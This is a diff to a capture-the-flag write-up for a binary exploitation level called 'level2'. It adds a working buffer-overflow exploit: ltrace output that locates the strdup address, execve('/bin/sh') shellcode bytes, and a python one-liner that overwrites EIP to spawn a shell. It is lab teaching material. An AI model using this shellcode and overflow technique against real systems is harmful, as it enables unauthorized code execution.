@@ -12,7 +12,7 @@ dr-x--x--x  1 root   root    340 Sep 23  2015 ..
 -rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
 ```
 
-Let's work on exploiting that level2 file. We're going to do so by running first running it with `gdb`:
+Let's work on exploiting that level2 file. We're going to do so by running it first with `gdb`:
 
 ```bash
 (gdb) info functions
@@ -96,3 +96,23 @@ Using our [generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-
 Knowing this we will try to inect a **shellcode** in **bytes** form.
 `execve("/bin/sh")` in 28 bytes :
 `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`
+
+**80 - 28 = 52** bytes, meaning we need to fill the buffer with our **shellcode** and **52 random chars**, plus right after it the **address** where `strdup` will copy the payload we just sent (this extra address after the 80th byte is **overwritting the EIP**)
+
+To **find the address** of the strdup we use `ltrace`:
+```bash
+ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                              = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)   = 0xbffff6fc
+puts("")                                        = 1
+strdup("")                                      = 0x0804a008
+```
+
+We then run our script:
+```bash
+((python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc
+0\x40\xcd\x80" + "a"*52 + "\x08\xa0\x04\x08"') && cat) | ./level2
+```
+
+And get the next flag !
